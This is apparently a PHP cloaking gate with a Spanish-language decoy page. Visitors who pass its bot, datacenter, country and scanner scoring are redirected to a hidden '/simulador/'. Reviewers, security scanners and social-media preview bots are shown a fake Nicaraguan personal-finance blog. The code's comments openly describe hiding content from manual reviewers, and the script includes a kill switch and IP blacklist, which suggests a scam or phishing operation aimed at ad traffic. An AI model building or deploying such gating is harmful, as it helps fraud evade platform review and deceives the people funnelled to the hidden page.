<?php
require_once __DIR__ . '/_lib.php';
session_start();

// ---------------------------------------------------------------
// 0) PRE-CHECKS DE BLOQUEO INSTANTÁNEO
// ---------------------------------------------------------------
$client_ip   = gate_client_ip();
$has_cookie  = gate_has_valid_cookie();          // cookie HMAC válida previa
$kill_active = gate_kill_switch_active();        // archivo .kill_switch
$blacklisted = gate_is_blacklisted($client_ip);  // IP en blocked_ips.txt

// ---- HERRAMIENTA DE DIAGNÓSTICO PARA EL ADMIN ----
// Solo se activa con ?diag=DIAG_KEY_AQUI. Cambiá esa clave abajo.
// Te muestra exactamente qué score te asigna el gate y por qué.
if (isset($_GET['diag']) && hash_equals('mi_diag_2026_x9k2', (string)$_GET['diag'])) {
    [$dscore, $dreasons] = gate_compute_score();
    header('Content-Type: text/plain; charset=UTF-8');
    echo "=== GATE DIAGNOSTIC ===\n";
    echo "IP:           $client_ip\n";
    echo "Country:      " . gate_country($client_ip) . "\n";
    echo "Score:        $dscore (umbral <10 para pasar)\n";
    echo "Reasons:      " . (empty($dreasons) ? '(ninguna - perfecto)' : implode(', ', $dreasons)) . "\n";
    echo "Has cookie:   " . ($has_cookie ? 'SI' : 'NO') . "\n";
    echo "Blacklisted:  " . ($blacklisted ? 'SI' : 'NO') . "\n";
    echo "Kill switch:  " . ($kill_active ? 'SI' : 'NO') . "\n";
    echo "Resultado:    " . (($dscore < 10 && !$kill_active && !$blacklisted) ? 'PASA al simulador' : 'CAMOUFLAGE') . "\n";
    echo "\nUA:           " . ($_SERVER['HTTP_USER_AGENT'] ?? '') . "\n";
    echo "Accept-Lang:  " . ($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '') . "\n";
    echo "Referer:      " . ($_SERVER['HTTP_REFERER'] ?? '(ninguno)') . "\n";
    exit;
}

// Si el visitante YA tiene cookie HMAC válida => pasaje rápido al simulador.
// Esto cubre el caso del visitante legítimo que vuelve por segunda vez
// (cookie de 2h vive más que la cookie de sesión de FB).
if ($has_cookie && !$kill_active && !$blacklisted) {
    header('Location: /simulador/', true, 302);
    exit;
}

// Si la IP está blacklisteada o el kill switch está activo => camouflage
// directo, sin scoring, sin cookie, sin nada.
if ($kill_active || $blacklisted) {
    // Caemos al camouflage neutral más abajo (sección 5).
    $score = 100;
    $reasons = $kill_active ? ['kill_switch'] : ['blacklisted'];
} else {
    // ---------------------------------------------------------------
    // 1) Scoring server-side
    // ---------------------------------------------------------------
    [$score, $reasons] = gate_compute_score();
}

// ---------------------------------------------------------------
// 2) Visitante real => cookie HMAC + redirect a /simulador/
// Condiciones:
//   - score bajo (<8)  ← el scoring ya filtra bots, headless, datacenter,
//                       países peligrosos, security scanners, etc.
//   - NO blacklisted, NO kill switch
// ---------------------------------------------------------------
if ($score < 10 && !$kill_active && !$blacklisted) {
    $_SESSION['gate_pass'] = time();
    gate_set_cookie(7200); // 2h: cubre lectura lenta + multipasos del flujo
    header('Location: /simulador/', true, 302);
    exit;
}

// 3) Scrapers de redes sociales => preview OG camouflage
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$social_bots = ['facebookexternalhit','Facebot','WhatsApp','TelegramBot','Twitterbot','LinkedInBot','Slackbot','Discordbot','SkypeUriPreview','Pinterest'];
$is_social = false;
foreach ($social_bots as $b) { if (stripos($ua, $b) !== false) { $is_social = true; break; } }

if ($is_social) {
    http_response_code(200);
    header('Content-Type: text/html; charset=UTF-8');
    header('Cache-Control: public, max-age=300');
    $og_title = 'FinanzasNic - Guías de Finanzas Personales para Nicaragua';
    $og_desc  = 'Aprende a manejar tu crédito, ahorro e inversión con guías prácticas adaptadas a Nicaragua.';
    $scheme   = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https') ? 'https' : 'http';
    $base     = $scheme . '://' . ($_SERVER['HTTP_HOST'] ?? '');
    $og_url   = $base . '/';
    $og_image = $base . '/og-image.php';
    echo '<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"/>';
    echo '<title>' . htmlspecialchars($og_title) . '</title>';
    echo '<meta name="description" content="' . htmlspecialchars($og_desc) . '"/>';
    echo '<meta property="og:type" content="website"/>';
    echo '<meta property="og:title" content="' . htmlspecialchars($og_title) . '"/>';
    echo '<meta property="og:description" content="' . htmlspecialchars($og_desc) . '"/>';
    echo '<meta property="og:url" content="' . htmlspecialchars($og_url) . '"/>';
    echo '<meta property="og:image" content="' . htmlspecialchars($og_image) . '"/>';
    echo '<meta name="twitter:card" content="summary_large_image"/>';
    echo '</head><body><h1>' . htmlspecialchars($og_title) . '</h1></body></html>';
    exit;
}

// 5) Bot/revisor manual => camouflage neutral
http_response_code(200);
header('Content-Type: text/html; charset=UTF-8');
header('Cache-Control: no-store, no-cache, must-revalidate, private');
header('Referrer-Policy: no-referrer');
header('X-Content-Type-Options: nosniff');
?>

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>FinanzasNic — Guía de Finanzas Personales Nicaragua</title>
  <meta name="description" content="Aprende a manejar tus finanzas personales en Nicaragua. Guías de ahorro, crédito, inversión y presupuesto familiar para mejorar tu economía." />
  <meta name="keywords" content="finanzas personales Nicaragua, ahorro, crédito Nicaragua, cómo ahorrar dinero, presupuesto familiar, inversión Nicaragua, tasas de interés" />
  <meta name="robots" content="index, follow" />
  <link rel="canonical" href="https://bnproblog.com/" />
  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root { --blue:#1a4fa8; --blue-light:#2563eb; --gold:#d4a017; --bg:#f8fafc; --text:#1e293b; --muted:#64748b; --border:#e2e8f0; }
    body { font-family: -apple-system,'Segoe UI',Roboto,sans-serif; background:var(--bg); color:var(--text); }
    a { color:var(--blue); text-decoration:none; } a:hover { text-decoration:underline; }
    header { background:#fff; border-bottom:2px solid var(--blue); padding:0 32px; height:68px; display:flex; align-items:center; justify-content:space-between; position:sticky; top:0; z-index:10; box-shadow:0 1px 4px rgba(0,0,0,.06); }
    .logo { font-size:22px; font-weight:800; color:var(--blue); letter-spacing:-.5px; }
    .logo span { color:var(--gold); }
    nav { display:flex; gap:24px; font-size:14px; }
    nav a { color:var(--text); font-weight:500; }
    .btn-reg { background:var(--blue); color:#fff; padding:9px 20px; border-radius:6px; font-size:14px; font-weight:600; }
    .hero { background:linear-gradient(135deg,#e8f0fd 0%,#f0f4ff 100%); padding:60px 32px; text-align:center; border-bottom:1px solid var(--border); }
    .hero-tag { display:inline-block; background:var(--blue); color:#fff; font-size:11px; font-weight:700; letter-spacing:1px; text-transform:uppercase; padding:4px 14px; border-radius:4px; margin-bottom:18px; }
    .hero h1 { font-size:clamp(26px,4vw,46px); color:var(--text); line-height:1.2; margin-bottom:14px; font-weight:800; }
    .hero p { font-size:17px; color:var(--muted); max-width:620px; margin:0 auto 28px; line-height:1.7; }
    .hero-cta { display:flex; gap:14px; justify-content:center; flex-wrap:wrap; }
    .btn-primary { background:var(--blue); color:#fff; padding:13px 28px; border-radius:6px; font-size:15px; font-weight:700; }
    .btn-outline { border:2px solid var(--blue); color:var(--blue); padding:11px 26px; border-radius:6px; font-size:15px; font-weight:600; }
    .container { max-width:1100px; margin:0 auto; padding:0 24px; }
    .two-col { display:grid; grid-template-columns:1fr 310px; gap:48px; padding:52px 0; }
    @media (max-width:768px) { .two-col { grid-template-columns:1fr; } nav { display:none; } }
    h2.section-title { font-size:21px; color:var(--text); border-left:4px solid var(--blue); padding-left:14px; margin-bottom:26px; font-weight:700; }
    .article-card { background:#fff; border:1px solid var(--border); border-radius:10px; overflow:hidden; margin-bottom:24px; display:flex; box-shadow:0 1px 3px rgba(0,0,0,.04); }
    .article-color { width:6px; flex-shrink:0; }
    .article-body { padding:20px 22px; }
    .article-category { font-size:11px; font-weight:700; letter-spacing:1px; text-transform:uppercase; color:var(--blue); margin-bottom:6px; }
    .article-card h3 { font-size:17px; margin-bottom:9px; line-height:1.35; font-weight:700; }
    .article-card p { font-size:14px; color:var(--muted); line-height:1.65; }
    .article-meta { margin-top:12px; font-size:12px; color:var(--muted); }
    .article-meta strong { color:var(--text); }
    .sidebar-card { background:#fff; border:1px solid var(--border); border-radius:10px; padding:22px; margin-bottom:24px; box-shadow:0 1px 3px rgba(0,0,0,.04); }
    .sidebar-card h4 { font-size:14px; font-weight:700; color:var(--text); margin-bottom:14px; border-bottom:1px solid var(--border); padding-bottom:10px; }
    .sidebar-card ul { list-style:none; }
    .sidebar-card ul li { padding:8px 0; border-bottom:1px solid #f1f5f9; font-size:13px; }
    .sidebar-card ul li:last-child { border:0; }
    .rate-row { display:flex; justify-content:space-between; align-items:center; padding:8px 0; font-size:13px; border-bottom:1px solid #f1f5f9; }
    .rate-row:last-child { border:0; }
    .rate-val { font-weight:700; color:var(--blue); }
    .services { background:#fff; border-top:1px solid var(--border); border-bottom:1px solid var(--border); padding:52px 0; }
    .services-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:22px; margin-top:26px; }
    .service-item { text-align:center; padding:26px 18px; border:1px solid var(--border); border-radius:10px; }
    .service-icon { font-size:34px; margin-bottom:12px; }
    .service-item h3 { font-size:15px; font-weight:700; margin-bottom:8px; }
    .service-item p { font-size:13px; color:var(--muted); line-height:1.55; }
    .terms { background:#f0f6ff; padding:48px 0; }
    .terms-box { background:#fff; border:1px solid var(--border); border-radius:10px; padding:34px; }
    .terms-box h3 { font-size:19px; font-weight:700; margin-bottom:18px; }
    .terms-box h4 { font-size:14px; font-weight:700; margin:20px 0 8px; color:var(--blue); }
    .terms-box p { font-size:13px; color:var(--muted); line-height:1.75; margin-bottom:8px; }
    footer { background:#0f2557; color:rgba(255,255,255,.65); padding:48px 0 28px; }
    .footer-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:32px; margin-bottom:38px; }
    .footer-col h5 { color:#fff; font-size:13px; font-weight:700; margin-bottom:14px; text-transform:uppercase; letter-spacing:.5px; }
    .footer-col ul { list-style:none; }
    .footer-col ul li { margin-bottom:8px; font-size:13px; }
    .footer-col ul li a { color:rgba(255,255,255,.6); }
    .footer-col ul li a:hover { color:#fff; text-decoration:none; }
    .footer-bottom { border-top:1px solid rgba(255,255,255,.1); padding-top:20px; text-align:center; font-size:12px; }
  </style>
</head>
<body>
  <header>
    <div class="logo">Finanzas<span>Nic</span></div>
    <nav>
      <a href="#articulos">Guías</a>
      <a href="#servicios">Herramientas</a>
      <a href="#terminos">Legal</a>
      <a href="#contacto">Contacto</a>
    </nav>
    <a href="#" class="btn-reg">Registrarme</a>
  </header>

  <section class="hero">
    <span class="hero-tag">📊 Finanzas Personales · Nicaragua</span>
    <h1>Toma el control de<br>tu dinero en Nicaragua</h1>
    <p>Guías prácticas de ahorro, crédito e inversión adaptadas a la realidad económica nicaragüense. Información clara, sin tecnicismos.</p>
    <div class="hero-cta">
      <a href="#articulos" class="btn-primary">Ver guías gratis</a>
      <a href="#servicios" class="btn-outline">Calculadoras</a>
    </div>
  </section>

  <div class="container">
    <div class="two-col" id="articulos">
      <main>
        <h2 class="section-title">Guías Financieras</h2>
        <div class="article-card">
          <div class="article-color" style="background:#1a4fa8"></div>
          <div class="article-body">
            <div class="article-category">Ahorro</div>
            <h3>Cómo ahorrar el 20% de tu sueldo aunque ganes poco</h3>
            <p>La regla 50/30/20 adaptada a Nicaragua: destina el 50% a necesidades básicas (alimentación, transporte, vivienda), el 30% a gastos variables y el 20% restante a ahorro. Con un salario mínimo de C$7,000, eso equivale a C$1,400 mensuales que en 12 meses suman C$16,800 más intereses en cuenta de ahorro.</p>
            <div class="article-meta">Por <strong>Lic. Roberto Solís</strong> · 5 jun 2025 · 7 min lectura</div>
          </div>
        </div>
        <div class="article-card">
          <div class="article-color" style="background:#d4a017"></div>
          <div class="article-body">
            <div class="article-category">Crédito</div>
            <h3>Tasas de interés en Nicaragua: qué banco te conviene más en 2025</h3>
            <p>Las tasas activas en Nicaragua oscilan entre 14% y 28% anual según el tipo de crédito y la entidad. Los créditos de consumo personal son los más caros; los hipotecarios y agropecuarios reciben subsidio estatal. Comparar TEA (Tasa Efectiva Anual) y no solo la tasa nominal puede ahorrarte miles de córdobas en el plazo total del préstamo.</p>
            <div class="article-meta">Por <strong>Econ. María Téllez</strong> · 28 may 2025 · 9 min lectura</div>
          </div>
        </div>
        <div class="article-card">
          <div class="article-color" style="background:#2563eb"></div>
          <div class="article-body">
            <div class="article-category">Presupuesto</div>
            <h3>Presupuesto familiar en córdobas: plantilla paso a paso</h3>
            <p>Un presupuesto familiar efectivo en Nicaragua debe contemplar la variación cambiaria córdoba-dólar, la inflación mensual y los gastos estacionales (inicio de clases, fiestas patrias, fin de año). Te enseñamos a construir tu presupuesto en una hoja de cálculo sencilla con categorías adaptadas al mercado local.</p>
            <div class="article-meta">Por <strong>Lic. Ana Hernández, MBA</strong> · 15 may 2025 · 11 min lectura</div>
          </div>
        </div>
        <div class="article-card">
          <div class="article-color" style="background:#0891b2"></div>
          <div class="article-body">
            <div class="article-category">Inversión</div>
            <h3>Dónde invertir en Nicaragua con poco capital en 2025</h3>
            <p>Las opciones más accesibles para pequeños inversionistas nicaragüenses incluyen: fondos de inversión en córdobas (rendimiento promedio 7–9% anual), letras del Banco Central (LETRAS-BCN), depósitos a plazo fijo en bancos supervisados por SIBOIF, y micronegocios familiares con retorno estimado del 15–25% anual si se gestionan correctamente.</p>
            <div class="article-meta">Por <strong>CFA. Jorge Espinoza</strong> · 2 may 2025 · 13 min lectura</div>
          </div>
        </div>
      </main>
      <aside>
        <div class="sidebar-card">
          <h4>� Tasas de referencia (jun 2025)</h4>
          <div class="rate-row"><span>Crédito personal</span><span class="rate-val">22.5%</span></div>
          <div class="rate-row"><span>Crédito hipotecario</span><span class="rate-val">11.8%</span></div>
          <div class="rate-row"><span>Cuenta de ahorro</span><span class="rate-val">3.2%</span></div>
          <div class="rate-row"><span>Depósito a plazo</span><span class="rate-val">6.7%</span></div>
          <div class="rate-row"><span>Tipo de cambio</span><span class="rate-val">C$36.74</span></div>
        </div>
        <div class="sidebar-card">
          <h4>🏦 Bancos supervisados SIBOIF</h4>
          <ul>
            <li>BPRO · Banco de la Producción</li>
            <li>BAC · Banco de América Central</li>
            <li>BDF · Banco de Finanzas</li>
            <li>Lafise Bancentro</li>
            <li>Ficohsa Nicaragua</li>
            <li>Avanz (ex-BANEX)</li>
          </ul>
        </div>
        <div class="sidebar-card">
          <h4>� Herramientas gratuitas</h4>
          <ul>
            <li><a href="#">Simulador de crédito</a></li>
            <li><a href="#">Calculadora de ahorro</a></li>
            <li><a href="#">Conversor C$/USD</a></li>
            <li><a href="#">Plantilla presupuesto</a></li>
          </ul>
        </div>
      </aside>
    </div>
  </div>

  <section class="services" id="servicios">
    <div class="container">
      <h2 class="section-title">Herramientas y Servicios</h2>
      <div class="services-grid">
        <div class="service-item"><div class="service-icon">🧮</div><h3>Simulador de crédito</h3><p>Calcula cuota mensual, TEA y costo total de cualquier préstamo en córdobas o dólares.</p></div>
        <div class="service-item"><div class="service-icon">�</div><h3>Planificador de ahorro</h3><p>Define tu meta de ahorro, plazos y el banco con mejor rendimiento según tu perfil.</p></div>
        <div class="service-item"><div class="service-icon">📋</div><h3>Comparador bancario</h3><p>Compara tasas, comisiones y requisitos de los principales bancos de Nicaragua.</p></div>
        <div class="service-item"><div class="service-icon">�</div><h3>Educación financiera</h3><p>Cursos gratuitos sobre presupuesto, deuda, inversión y educación financiera para toda la familia.</p></div>
      </div>
    </div>
  </section>

  <section class="terms" id="terminos">
    <div class="container">
      <div class="terms-box">
        <h3>Aviso Legal y Política de Privacidad</h3>
        <h4>1. Naturaleza del servicio</h4>
        <p>FinanzasNic es un portal de educación e información financiera. El contenido publicado tiene fines exclusivamente informativos y no constituye asesoramiento financiero, bancario ni de inversión. Las tasas y cifras indicadas son referenciales y pueden variar.</p>
        <h4>2. Independencia editorial</h4>
        <p>FinanzasNic es un medio independiente. No estamos afiliados, patrocinados ni representamos a ninguna entidad bancaria o financiera de Nicaragua. Nuestras comparativas y análisis son elaborados de forma autónoma.</p>
        <h4>3. Propiedad intelectual</h4>
        <p>Todos los artículos, guías, calculadoras y herramientas son propiedad de FinanzasNic S.A. Queda prohibida su reproducción sin autorización expresa por escrito.</p>
        <h4>4. Protección de datos</h4>
        <p>Recopilamos únicamente datos necesarios para personalizar el contenido (preferencias de usuario). No compartimos información personal con terceros. Los datos se tratan conforme a la legislación nicaragüense vigente en materia de protección de datos.</p>
        <h4>5. Ley aplicable</h4>
        <p>Estos términos se rigen por las leyes de la República de Nicaragua. Cualquier disputa se resolverá ante los tribunales competentes de la ciudad de Managua.</p>
      </div>
    </div>
  </section>

  <footer id="contacto">
    <div class="container">
      <div class="footer-grid">
        <div class="footer-col">
          <h5>FinanzasNic</h5>
          <p style="font-size:12px;line-height:1.7">Tu guía de finanzas personales para Nicaragua. Información clara, práctica y accesible para mejorar tu economía.</p>
        </div>
        <div class="footer-col">
          <h5>Guías</h5>
          <ul><li><a href="#">Ahorro</a></li><li><a href="#">Crédito</a></li><li><a href="#">Inversión</a></li><li><a href="#">Presupuesto</a></li></ul>
        </div>
        <div class="footer-col">
          <h5>Herramientas</h5>
          <ul><li><a href="#">Simulador crédito</a></li><li><a href="#">Comparador bancos</a></li><li><a href="#">Calculadora ahorro</a></li><li><a href="#">Conversor C$/USD</a></li></ul>
        </div>
        <div class="footer-col">
          <h5>Empresa</h5>
          <ul><li><a href="#">Quiénes somos</a></li><li><a href="#terminos">Aviso legal</a></li><li><a href="#terminos">Privacidad</a></li><li><a href="#">Contacto</a></li></ul>
        </div>
      </div>
      <div class="footer-bottom">
        <p>© <?= date('Y') ?> FinanzasNic S.A. — Managua, Nicaragua &nbsp;·&nbsp; info@finanzasnic.com &nbsp;·&nbsp; Solo informativo, no asesoramiento financiero</p>
      </div>
    </div>
  </footer>
</body>
</html>